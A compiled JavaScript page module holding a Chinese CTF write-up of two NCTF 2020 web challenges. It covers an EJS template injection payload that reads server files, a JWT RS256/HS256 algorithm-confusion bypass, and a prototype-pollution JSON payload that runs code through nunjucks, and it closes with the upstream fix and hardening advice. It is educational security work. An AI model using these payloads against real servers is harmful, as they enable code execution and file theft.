import{_ as o}from"./ArticleWrapper.5f379090.js";import{c as l,w as p,o as c,a as t,J as r,b as e}from"./app.91692cd0.js";import"./dayjs.min.28e220c7.js";const i="/assets/problem1-1.ed05b544.png",u="/assets/problem1-2.25dd9ae3.png",d="/assets/problem2-1.87857088.png",g="/assets/problem2-2.432df6d4.png",m="/assets/problem2-3.55986c77.png",_="/assets/problem2-5.2904044f.png",k=t("div",{class:"markdown-body"},[t("h1",{id:"%E5%89%8D%E8%A8%80",tabindex:"-1"},"\u524D\u8A00"),t("p",null,"\u4ECE\u5927\u4E00\u5F00\u59CB\u6211\u6BCF\u5E74\u90FD\u6253 NCTF\uFF0C~~\u9664\u4E86\u6070\u70C2\u94B1\uFF0C~~\u611F\u89C9\u6BCF\u6B21\u90FD\u53EF\u4EE5\u5B66\u5230\u70B9\u4E0D\u4E00\u6837\u7684\u4E1C\u897F\u3002\u4ECA\u5E74\u7684 web \u9898\u6709\u70B9\u4E0D\u4E00\u6837\uFF0C\u611F\u89C9\u633A\u6709\u610F\u601D\u7684\uFF0C\u52A0\u6DF1\u4E86\u6211\u5BF9 JavaScript \u76F8\u5173\u7684\u4E00\u4E9B\u5B89\u5168\u95EE\u9898\u7684\u7406\u89E3\u3002"),t("p",null,[t("img",{src:r,alt:"profile"})]),t("h2",{id:"js-world",tabindex:"-1"},"JS-world"),t("p",null,[t("img",{src:i,alt:"problem1-1.png"})]),t("p",null,"\u8FD9\u9053\u9898\u6D89\u53CA\u5230\u7684\u662F ejs \u6A21\u677F\u7684\u6CE8\u5165\u95EE\u9898\uFF0C\u540C\u65F6\u4F20\u5165\u7684\u540E\u7AEF\u7684\u4FE1\u606F\u4F1A\u5148\u7ECF\u8FC7\u524D\u7AEF\u8FC7\u6EE4\u4E00\u6B21\u3002\u53EF\u4EE5\u901A\u8FC7 DevTool \u7684\u65AD\u70B9\u8C03\u8BD5\u529F\u80FD\uFF0C\u627E\u5230\u76F8\u5173\u7684\u8FC7\u6EE4\u5173\u952E\u5B57\u7684\u4EE3\u7801\u5982\u4E0B\uFF0C\u5220\u9664\u540E\u5373\u53EF\u7ED5\u8FC7\u3002"),t("pre",{class:"language-javascript"},[t("code",{class:"language-javascript"},[e("_0x23132f "),t("span",{class:"token operator"},"="),e(" _0x23132f"),t("span",{class:"token punctuation"},"["),t("span",{class:"token function"},"_0x1bef85"),t("span",{class:"token punctuation"},"("),t("span",{class:"token string"},'"0x5"'),t("span",{class:"token punctuation"},")"),t("span",{class:"token punctuation"},"]"),t("span",{class:"token punctuation"},"("),e(`
  `),t("span",{class:"token regex"},[t("span",{class:"token regex-delimiter"},"/"),t("span",{class:"token regex-source language-regex"},"[\\/\\*\\'\\\"\\`\\<\\\\\\>\\-\\(\\)\\[\\]\\=\\%\\.]"),t("span",{class:"token regex-delimiter"},"/"),t("span",{class:"token regex-flags"},"g")]),t("span",{class:"token punctuation"},","),e(`
  `),t("span",{class:"token string"},'""'),e(`
`),t("span",{class:"token punctuation"},")"),t("span",{class:"token punctuation"},";"),e(`
`)])]),t("p",null,[e("\u8FD9\u91CC\u7684\u8F93\u5165\u5B58\u5728\u6A21\u677F\u6CE8\u5165\u95EE\u9898\uFF0C\u901A\u8FC7 payload "),t("code",null,'> <%= global.process.mainModule.constructor._load("fs"). readdirSync("/") %> <'),e(" \u548C"),t("code",null,'> <%= global.process.mainModule.constructor._load("fs"). readFileSync("/flag.txt") %> <'),e(" \u5373\u53EF\u8BFB\u53D6\u76EE\u5F55\u5E76\u83B7\u5F97 flag")]),t("p",null,[t("img",{src:u,alt:"problem1-1.png"})]),t("h2",{id:"packagemanager_v1.0",tabindex:"-1"},"PackageManager_v1.0"),t("p",null,"\u8FD9\u9053\u9898\u53EF\u4EE5\u83B7\u53D6\u5230\u6E90\u7801\uFF0C\u901A\u8FC7\u5BA1\u8BA1\u4EE3\u7801\u53D1\u73B0\u4E86\u4E00\u4E2A\u95EE\u9898\uFF0C\u8FD9\u91CC\u7684\u9274\u6743\u4F7F\u7528\u7684\u662F JWT token\uFF0C\u7B7E\u540D\u65F6\u4F7F\u7528\u7684\u662F RS256\uFF0C\u4F46\u662F\u9A8C\u8BC1\u65F6\u4F7F\u7528\u7684\u662F RS256 \u548C HS256\uFF0C\u540C\u65F6\u5C06\u516C\u94A5\u52A0\u5230\u4E86 payload \u4E2D\u3002RS256 \u662F\u975E\u5BF9\u79F0\u52A0\u5BC6\u7B97\u6CD5\uFF0CHS256 \u662F\u5BF9\u79F0\u52A0\u5BC6\u7B97\u6CD5\u3002\u56E0\u6B64\u6211\u4EEC\u53EF\u4EE5\u89E3\u6790 token \u540E\u83B7\u53D6\u5230\u516C\u94A5\uFF0C\u5E76\u4F7F\u7528\u516C\u94A5\u548C HS256 \u751F\u6210\u81EA\u5DF1\u7684 token\uFF0C\u7ED5\u8FC7\u9274\u6743\u3002"),t("p",null,[t("img",{src:d,alt:"problem2-1"})]),t("p",null,"\u4EE3\u7801\u4E2D\u5B58\u5728\u7740\u5BF9\u8C61 clone \u7684\u4EE3\u7801\uFF0C\u6709\u539F\u578B\u94FE\u6C61\u67D3\u7684\u6F0F\u6D1E"),t("p",null,[t("img",{src:g,alt:"problem2-2"})]),t("p",null,[t("img",{src:m,alt:"problem2-3"})]),t("p",null,[e("\u8FD9\u91CC\u5F53\u7B2C 9 \u884C\u7684 key \u4E3A"),t("code",null,"__proto__"),e("\u65F6\u5C31\u4F1A\u9020\u6210\u539F\u578B\u94FE\u6C61\u67D3\uFF0C\u4FEE\u6539\u53D8\u91CF"),t("code",null,"a"),e("\u7684\u539F\u578B(\u5373 Object.prototype)\u4E0A\u7684\u5C5E\u6027\u3002")]),t("p",null,[e("\u540C\u65F6\uFF0C\u8FD9\u91CC\u4F7F\u7528\u7684\u6A21\u677F\u5F15\u64CE\u662F nunjucks\uFF0C\u5176\u6E90\u4EE3\u7801\u4E2D\u5B58\u5728\u7740\u4E00\u4E9B"),t("code",null,"new Function"),e("\u548C\u5B57\u7B26\u4E32\u62FC\u63A5\uFF0C\u6709\u88AB\u6CE8\u5165\u7684\u53EF\u80FD\u6027\u3002")]),t("p",null,"\u6784\u9020 payload \u5982\u4E0B\uFF0C\u5373\u53EF\u6210\u529F\u83B7\u53D6 flag"),t("pre",{class:"language-json"},[t("code",{class:"language-json"},[t("span",{class:"token punctuation"},"{"),e(`
  `),t("span",{class:"token property"},'"author"'),t("span",{class:"token operator"},":"),e(),t("span",{class:"token string"},'"111"'),t("span",{class:"token punctuation"},","),e(`
  `),t("span",{class:"token property"},'"__proto__"'),t("span",{class:"token operator"},":"),e(),t("span",{class:"token punctuation"},"{"),e(`
    `),t("span",{class:"token property"},'"description"'),t("span",{class:"token operator"},":"),e(),t("span",{class:"token string"},`"global.process.mainModule.require('fs').readFileSync('/w0w_Congrats_Th1s_1s_y0ur_flaaag')"`),e(`
  `),t("span",{class:"token punctuation"},"}"),e(`
`),t("span",{class:"token punctuation"},"}"),e(`
`)])]),t("p",null,[t("img",{src:_,alt:"problem2-5"})]),t("p",null,"-------------------------\u65F6\u95F4\u5206\u5272\u7EBF---------------------------"),t("p",null,"2020 \u5E74 11 \u6708 25 \u65E5"),t("p",null,[t("img",{src:"https://user-images.githubusercontent.com/42082890/100094205-9cc29480-2e93-11eb-8365-6b2d191de84e.png",alt:"payload"})]),t("p",null,[e("\u540E\u9762\u6392\u67E5\u53D1\u73B0\u8FD9\u4E2A\u662F"),t("code",null,"nunjucks"),e("\u7684\u4E00\u4E2A\u6F0F\u6D1E\uFF0C\u76EE\u524D\u5DF2\u7ECF\u53D1\u8D77 Pull Request \u4FEE\u590D\u4E86"),t("a",{href:"https://github.com/mozilla/nunjucks/pull/1330/"},"nunjucks/pull/1330/"),e("\u3002\u611F\u8C22\u51FA\u9898\u4EBA"),t("a",{href:"https://bycsec.top"},"@baiyecha404"),e("\u7684\u9898\u53D1\u73B0\u4E86\u8FD9\u4E2A\u6F0F\u6D1E\u3002")]),t("p",null,[e("\u7ECF\u8FC7\u6392\u67E5\uFF0C\u95EE\u9898\u51FA\u5728"),t("a",{href:"https://github.com/mozilla/nunjucks/blob/f51afa3382eab27ccb216c0f302832e5a4135ac5/nunjucks/src/runtime.js"},"nunjucks/src/runtime.js"),e("\u6587\u4EF6\u4E2D"),t("code",null,"Frame.prototype.variables"),e("\u53D8\u91CF\u4E2D\uFF0C\u9519\u8BEF\u5730\u4F7F\u7528\u666E\u901A\u7684 object \u4F5C\u4E3A Map \u4F7F\u7528\uFF0C\u5BFC\u81F4\u8BFB\u53D6\u53D8\u91CF\u65F6\u53EF\u80FD\u4F1A\u4ECE Object.prototype \u4E2D\u8BFB\u53D6\u53D8\u91CF\u3002\u5F53 npm \u5305\u5916\u53D1\u751F Object.prototype \u88AB\u6C61\u67D3\u65F6\uFF0C\u4F1A\u5BFC\u81F4\u8BFB\u53D6 variables \u4E0A\u7684\u5C5E\u6027\u65F6\u5F97\u5230\u610F\u6599\u4E4B\u5916\u7684\u503C\uFF0C\u540C\u65F6\u6A21\u677F\u5F15\u64CE\u5B58\u5728\u7740\u5927\u91CF\u5B57\u7B26\u4E32\u62FC\u63A5\uFF0C\u8FD9\u5BFC\u81F4 payload \u88AB\u6267\u884C\u3002")]),t("p",null,[e("\u4F7F\u7528"),t("code",null,"Object.create(null)"),e("\u66FF\u4EE3"),t("code",null,"{}"),e("\u4F5C\u4E3A Map \u4F1A\u66F4\u4E3A\u5B89\u5168\uFF0C\u540C\u65F6\u4E5F\u53EF\u4EE5\u5BF9\u539F\u578B\u4F7F\u7528"),t("code",null,"Object.freeze"),e("\u907F\u514D\u539F\u578B\u88AB\u610F\u5916\u4FEE\u6539\u3002")])],-1),w="NCTF2020\u590D\u76D8",v="default description",S="2020-11-23T18:36:19.000Z",T=["\u4FE1\u606F\u5B89\u5168"],F="./profile.png",M=[{depth:1,title:"\u524D\u8A00",children:[{depth:2,title:"JS-world",children:[]},{depth:2,title:"PackageManager_v1.0",children:[]}]}],C=[{property:"og:title",name:"twitter:title",itemprop:"title",content:"NCTF2020\u590D\u76D8"},{property:"og:description",name:"twitter:description",itemprop:"description",content:"default description"}],N={__name:"content",setup(b,{expose:s}){const n={title:"NCTF2020\u590D\u76D8",description:"default description",date:"2020-11-23T18:36:19.000Z",tags:["\u4FE1\u606F\u5B89\u5168"],coverImage:"./profile.png",headings:[{depth:1,title:"\u524D\u8A00",children:[{depth:2,title:"JS-world",children:[]},{depth:2,title:"PackageManager_v1.0",children:[]}]}],meta:[{property:"og:title",name:"twitter:title",itemprop:"title",content:"NCTF2020\u590D\u76D8"},{property:"og:description",name:"twitter:description",itemprop:"description",content:"default description"}]};return s({frontmatter:n}),(f,h)=>{const a=o;return c(),l(a,{frontmatter:n},{default:p(()=>[k]),_:1})}}};export{F as coverImage,S as date,N as default,v as description,M as headings,C as meta,T as tags,w as title};
